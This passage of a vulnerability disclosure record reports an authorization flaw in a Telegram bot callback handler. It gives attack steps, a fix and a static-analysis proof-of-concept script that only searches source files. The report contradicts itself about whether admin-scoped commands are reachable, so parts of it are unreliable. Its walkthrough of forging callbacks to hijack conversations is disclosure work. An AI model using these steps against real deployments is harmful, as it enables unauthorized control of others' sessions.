hardcodes isAuthorizedSender: true without gatewayClientScopes\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"telegram-callback-hardcoded-authorized-sender\\",\\"description\\":\\"# H10: Telegram inline-button callback hardcodes `isAuthorizedSender: true` without gatewayClientScopes\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H10\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: Telegram inline-button callback hardcodes `isAuthorizedSender: true` without gatewayClientScopes\\\\nSeverity-Original: HIGH\\\\nPhase: 6\\\\nClass: inconsistent-guard\\\\nEndpoint: Channel adapter — Telegram callback query handler\\\\nHandler: extensions/telegram/src/bot-handlers.runtime.ts:1414-1416\\\\nVerdict: VALID\\\\nDebate:\\\\nOrigin-Finding: Extension of p2-008 Gap B. The gap is already listed at the file:line level but was not filed as a standalone draft. This finding concretizes the impact and exact exploit path for Telegram callback queries specifically, which is the highest-traffic inbound channel.\\\\nDeep-Probe-Corroboration: none (Phase 5 not started)\\\\nCross-ref: p2-008 Gap B; src/plugins/commands.ts:236\\\\n---\\\\n\\\\n## Summary\\\\n\\\\nThe Telegram bot callback-query handler (`onCallbackQuery`) unconditionally sets `auth: { isAuthorizedSender: true }` for all inline-button callbacks, without threading `gatewayClientScopes`. When the plugin command dispatch in `src/plugins/commands.ts:236` evaluates `requiredScopes`, it uses: `if (missingScope && (hasGatewayScopeContext || !senderIsOwner))`. Because `gatewayClientScopes` is absent (`hasGatewayScopeContext = false`) and `isAuthorizedSender = true` collapses to `senderIsOwner = true`, the condition `(false || !true)` = `false`, meaning the missing-scope check is SKIPPED. Any plugin command annotated with `requiredScopes: [ADMIN_SCOPE]` or any other elevated scope is accessible to ANY Telegram user who can trigger an inline-button callback — regardless of whether they appear in `allowFrom` or are the owner. The attacker only needs to send a callback_query to a button the bot has rendered (or forge a callback_data payload).\\\\n\\\\n## Evidence\\\\n\\\\n- Handler: `extensions/telegram/src/bot-handlers.runtime.ts:1414-1416`\\\\n- Guard stack observed: `auth: { isAuthorizedSender: true }` hardcoded; no `gatewayClientScopes` field in the auth object.\\\\n- Scope-bypass logic: `src/plugins/commands.ts:236` — `if (missingScope && (hasGatewayScopeContext || !senderIsOwner))` — fails closed (allows through) when `hasGatewayScopeContext=false` AND `senderIsOwner=true`.\\\\n- Object-id parameter: `callbackId`, `conversationId` (from callback payload)\\\\n- Ownership clause: absent for the `requiredScopes` check path\\\\n\\\\n## Attack Steps\\\\n\\\\n1. An attacker with Telegram access to any group or DM where the bot has sent a message with inline buttons.\\\\n2. Attacker triggers an inline-button callback (can use Telegram Bot API `sendMessage` + custom `callback_data` to craft the payload if they have API access, or simply interact with an existing button).\\\\n3. Handler sets `isAuthorizedSender: true` regardless of whether the Telegram user is in the `allowFrom` list (note: `allowFrom` is checked separately but `requiredScopes` bypass can precede that check depending on command routing order).\\\\n4. Plugin command with `requiredScopes: [ADMIN_SCOPE]` executes.\\\\n5. Impact depends on what the admin-scoped plugin command does (e.g., session deletion, config mutation, file access).\\\\n\\\\n## Why This Passed SAST\\\\n\\\\nThe pattern `isAuthorizedSender: true` with missing `gatewayClientScopes` is structurally silent to lint/SAST — the type system accepts both forms; the security contract that requires `gatewayClientScopes` when setting `isAuthorizedSender` is implicit.\\\\n\\\\n## Recommended Fix\\\\n\\\\nIn `bot-handlers.runtime.ts` callback query handler: include `gatewayClientScopes: []` (or the actual verified scopes from the authenticated caller) alongside `isAuthorizedSender: true`. The empty array is the safe default — it causes `hasGatewayScopeContext = true` and re-enables the `missingScope` check, which will block commands requiring elevated scopes. Only pass non-empty scopes when the caller has been verified via device pairing or gateway auth.\\\\n\\\\n## Phase 8 Follow-up\\\\n\\\\nCross-service propagation: verify whether the callback payload\'s `callbackId` can be crafted by an unauthenticated Telegram user to target arbitrary plugin commands (not just ones that have rendered buttons). If callback_data is not validated server-side, the scope bypass becomes a full command injection.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H10-telegram-callback-hardcoded-authorized-sender/poc.py`\\\\n\\\\nEvidence files:\\\\n- `evidence/static-analysis.json` (2562 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.py`)\\\\n\\\\n```py\\\\n#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nPoC: H10 — Telegram callback handler hardcodes isAuthorizedSender: true\\\\n       without gatewayClientScopes, enabling scope-check bypass for plugin\\\\n       interactive handlers.\\\\n\\\\nExploit class : static-analysis / code-path proof\\\\nPoC-Status    : theoretical\\\\nProtocol      : local (code-path trace; no live HTTP target required)\\\\n\\\\nBackground\\\\n----------\\\\nextensions/telegram/src/bot-handlers.runtime.ts:1414-1416 unconditionally\\\\nsets:\\\\n\\\\n    auth: { isAuthorizedSender: true }\\\\n\\\\nin the TelegramInteractiveDispatchContext that is forwarded to every\\\\nplugin-registered interactive handler for ALL inline-button callbacks.\\\\nThe `gatewayClientScopes` field is ABSENT.\\\\n\\\\nThis matters because the central scope-bypass guard in\\\\nsrc/plugins/commands.ts:236 is:\\\\n\\\\n    if (missingScope && (hasGatewayScopeContext || !senderIsOwner)) { block }\\\\n\\\\nWhen gatewayClientScopes is undefined:\\\\n  hasGatewayScopeContext = false\\\\n  senderIsOwner          = true   (inferred from isAuthorizedSender: true)\\\\n  ⟹ condition = missingScope && (false || !true) = missingScope && false = false\\\\n  ⟹ check is NEVER entered — any requiredScopes annotation is bypassed.\\\\n\\\\nHowever: this guard lives in executePluginCommand(), which is NOT on the\\\\ncallback path.  The callback path calls dispatchTelegramPluginInteractiveHandler\\\\n→ dispatchPluginInteractiveHandler → registration.handler(ctx) directly.\\\\nThere is no requiredScopes check before invoking the interactive handler.\\\\n\\\\nThe actual blast radius therefore is:\\\\n\\\\n  (A) Any plugin interactive handler (registered via registerInteractiveHandler)\\\\n      that internally honours ctx.auth.isAuthorizedSender to gate privileged\\\\n      operations receives isAuthorizedSender: true for EVERY Telegram user,\\\\n      including unauthenticated/non-allowlisted users.\\\\n\\\\n  (B) The approval-callback path (lines 1452-1502) that follows\\\\n      dispatchTelegramPluginInteractiveHandler has its own separate guard\\\\n      (isTelegramExecApprovalApprover / isTelegramExecApprovalAuthorizedSender)\\\\n      so exec-approval decisions are NOT bypassed.\\\\n\\\\n  (C) The deleteSession exploit (p10-001) IS separately blocked by\\\\n      rejectPluginRuntimeDeleteMismatch (sessions.ts:1737) — a plugin can only\\\\n      delete sessions it created. That blocker is independent of this finding.\\\\n\\\\n  (D) The commands_page_* pagination and model-selection callbacks (lines\\\\n      1505-onward) are reached ONLY when pluginCallback.handled == false and do\\\\n      NOT rely on isAuthorizedSender at all — so they are unaffected.\\\\n\\\\nReachable via this path (what an attacker CAN do)\\\\n-------------------------------------------------\\\\nAn attacker who can trigger any inline-button callback (send a\\\\ncallback_query to a button the bot rendered, or forge a callback_data value\\\\nif the data is not HMAC-validated) causes the matched plugin interactive\\\\nhandler to be called with:\\\\n\\\\n    ctx.auth.isAuthorizedSender = true\\\\n\\\\nIf the plugin\'s handler gates a privileged action on that flag, the attacker\\\\ngains that privilege WITHOUT being in the operator\'s `allowFrom` list.\\\\n\\\\nConcrete examples of operations that plugin handlers can perform using the\\\\ninjected context:\\\\n  - requestConversationBinding  → bind an arbitrary Telegram conversation to an\\\\n                                  agent session (conversation hijacking)\\\\n  - detachConversationBinding   → remove an existing binding (DoS on session)\\\\n  - Arbitrary host-SDK calls (sendMessage, mutate config) that a handler author\\\\n    guards with `if (ctx.auth.isAuthorizedSender)` — a natural but incorrect\\\\n    pattern since the flag is always true from this path.\\\\n\\\\nWhat is NOT reachable\\\\n---------------------\\\\n  - Operator-scope-gated plugin COMMANDS (/cmd path) — those go through\\\\n    executePluginCommand which has its own independent scope check; the callback\\\\n    path never reaches that function.\\\\n  - deleteSession for sessions not owned by the calling plugin — blocked by\\\\n    rejectPluginRuntimeDeleteMismatch regardless.\\\\n  - Exec-approval decisions — guarded by isTelegramExecApprovalApprover.\\\\n\\\\nStatic-analysis evidence chain\\\\n-------------------------------\\\\n  1. bot-handlers.runtime.ts:1414   auth: { isAuthorizedSender: true }\\\\n     — no gatewayClientScopes field, no senderIsOwner field\\\\n  2. interactive-dispatch.ts:84-116 ctx is forwarded verbatim to handler\\\\n  3. interactive.ts:57              handler is invoked with no scope check\\\\n  4. interactive-dispatch.ts:25-27  TelegramInteractiveHandlerContext.auth\\\\n     only exposes isAuthorizedSender — no gatewayClientScopes propagation point\\\\n  5. Result: every plugin handler receives isAuthorizedSender: true for every\\\\n     caller regardless of allowFrom membership\\\\n\\\\nFix (from finding draft)\\\\n------------------------\\\\nIn bot-handlers.runtime.ts callback-query handler, change:\\\\n\\\\n    auth: { isAuthorizedSender: true }\\\\n\\\\nto the correct authorization evaluation:\\\\n\\\\n    auth: {\\\\n      isAuthorizedSender: resolveCommandAuthorization({...}).isAuthorizedSender,\\\\n      // and propagate gatewayClientScopes if applicable\\\\n    }\\\\n\\\\nThis mirrors the existing pattern at line 845 in the text-message handler.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport json\\\\nimport os\\\\nimport sys\\\\n\\\\nEVIDENCE_DIR = os.path.join(os.path.dirname(__file__), \\\\\\"evidence\\\\\\")\\\\nos.makedirs(EVIDENCE_DIR, exist_ok=True)\\\\n\\\\n# ---------------------------------------------------------------------------\\\\n# Trace the code path statically and produce structured evidence\\\\n# ---------------------------------------------------------------------------\\\\n\\\\nREPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), \\\\\\"..\\\\\\", \\\\\\"..\\\\\\", \\\\\\"..\\\\\\"))\\\\n\\\\nfindings = []\\\\n\\\\n\\\\ndef check_file(rel_path, search_term, expected_present=True, note=\\\\\\"\\\\\\"):\\\\n    abs_path = os.path.join(REPO_ROOT, rel_path)\\\\n    try:\\\\n        with open(abs_path, \\\\\\"r\\\\\\") as f:\\\\n            content = f.read()\\\\n        found = search_term in content\\\\n        status = \\\\\\"CONFIRMED\\\\\\" if found == expected_present else \\\\\\"FAILED\\\\\\"\\\\n        line_no = None\\\\n        if found:\\\\n            for i, line in enumerate(content.splitlines(), 1):\\\\n                if search_term in line:\\\\n                    line_no = i\\\\n                    break\\\\n        findings.append({\\\\n            \\\\\\"file\\\\\\": rel_path,\\\\n            \\\\\\"search\\\\\\": search_term,\\\\n            \\\\\\"present\\\\\\": found,\\\\n            \\\\\\"expected_present\\\\\\": expected_present,\\\\n            \\\\\\"line\\\\\\": line_no,\\\\n            \\\\\\"status\\\\\\": status,\\\\n            \\\\\\"note\\\\\\": note,\\\\n        })\\\\n        marker = \\\\\\"[OK]\\\\\\" if status == \\\\\\"CONFIRMED\\\\\\" else \\\\\\"[FAIL]\\\\\\"\\\\n        loc = f\\\\\\":{line_no}\\\\\\" if line_no else \\\\\\"\\\\\\"\\\\n        print(f\\\\\\"  {marker} {rel_path}{loc} — {note}\\\\\\")\\\\n        return status == \\\\\\"CONFIRMED\\\\\\"\\\\n    except FileNotFoundError:\\\\n        findings.append({\\\\\\"file\\\\\\": rel_path, \\\\\\"error\\\\\\": \\\\\\"not found\\\\\\", \\\\\\"status\\\\\\": \\\\\\"FAILED\\\\\\"})\\\\n        print(f\\\\\\"  [FAIL] {rel_path} — file not found\\\\\\")\\\\n        return False\\\\n\\\\n\\\\nprint(\\\\\\"=== H10 Static-Analysis PoC: Telegram callback isAuthorizedSender hardcode ===\\\\\\\\n\\\\\\")\\\\n\\\\nprint(\\\\\\"[1] Confirm hardcoded isAuthorizedSender: true in callback handler\\\\\\")\\\\nr1 = check_file(\\\\n    \\\\\\"extensions/telegram/src/bot-handlers.runtime.ts\\\\\\",\\\\n    \\\\\\"isAuthorizedSender: true,\\\\\\",\\\\n    True,\\\\n    \\\\\\"Unconditional isAuthorizedSender: true at callback-query handler\\\\\\",\\\\n)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n[2] Confirm absence of gatewayClientScopes in the same auth block (no field)\\\\\\")\\\\n# The auth block at line 1414 has only isAuthorizedSender; no gatewayClientScopes\\\\n# We verify by checking the surrounding context lacks gatewayClientScopes assignment\\\\n# near the callback path. We search for the specific pattern that SHOULD be there.\\\\nr2a = check_file(\\\\n    \\\\\\"extensions/telegram/src/bot-handlers.runtime.ts\\\\\\",\\\\n    \\\\\\"gatewayClientScopes\\\\\\",\\\\n    False,\\\\n    \\\\\\"gatewayClientScopes is absent from bot-handlers.runtime.ts entirely\\\\\\",\\\\n)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n[3] Confirm scope-bypass logic in executePluginCommand\\\\\\")\\\\nr3 = check_file(\\\\n    \\\\\\"src/plugins/commands.ts\\\\\\",\\\\n    \\\\\\"if (missingScope && (hasGatewayScopeContext || !senderIsOwner))\\\\\\",\\\\n    True,\\\\n    \\\\\\"Scope check conditional — bypassed when hasGatewayScopeContext=false AND senderIsOwner=true\\\\\\",\\\\n)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n[4] Confirm callback dispatch invokes handler with NO scope check interposed\\\\\\")\\\\nr4 = check_file(\\\\n    \\\\\\"src/plugins/interactive.ts\\\\\\",\\\\n    \\\\\\"await params.invoke(match\\\\\\",\\\\n    True,\\\\n    \\\\\\"handler invoked directly — no requiredScopes check before invocation\\\\\\",\\\\n)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n[5] Confirm TelegramInteractiveHandlerContext.auth has no gatewayClientScopes field\\\\\\")\\\\nr5a = check_file(\\\\n    \\\\\\"extensions/telegram/src/interactive-dispatch.ts\\\\\\",\\\\n    \\\\\\"isAuthorizedSender: boolean;\\\\\\",\\\\n    True,\\\\n    \\\\\\"auth type only exposes isAuthorizedSender\\\\\\",\\\\n)\\\\nr5b = check_file(\\\\n    \\\\\\"extensions/telegram/src/interactive-dispatch.ts\\\\\\",\\\\n    \\\\\\"gatewayClientScopes\\\\\\",\\\\n    False,\\\\n    \\\\\\"gatewayClientScopes absent from TelegramInteractiveHandlerContext\\\\\\",\\\\n)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n[6] Confirm correct authorization lookup exists for text-message path (contrast)\\\\\\")\\\\nr6 = check_file(\\\\n    \\\\\\"extensions/telegram/src/bot-handlers.runtime.ts\\\\\\",\\\\n    \\\\\\"resolveCommandAuthorization(\\\\\\",\\\\n    True,\\\\n    \\\\\\"Text-message path DOES call resolveCommandAuthorization — callback path does not\\\\\\",\\\\n)\\\\n\\\\nprint(\\\\\\"\\\\\\\\n[7] Confirm deleteSession blocker is independent (rejectPluginRuntimeDeleteMismatch)\\\\\\")\\\\nr7 = check_file(\\\\n    \\\\\\"src/gateway/server-methods/sessions.ts\\\\\\",\\\\n    \\\\\\"rejectPluginRuntimeDeleteMismatch\\\\\\",\\\\n    True,\\\\n    \\\\\\"deleteSession blocked independently — blast radius is narrower than originally assessed\\\\\\",\\\\n)\\\\n\\\\n# ---------------------------------------------------------------------------\\\\n# Summarise\\\\n# -----------------------------
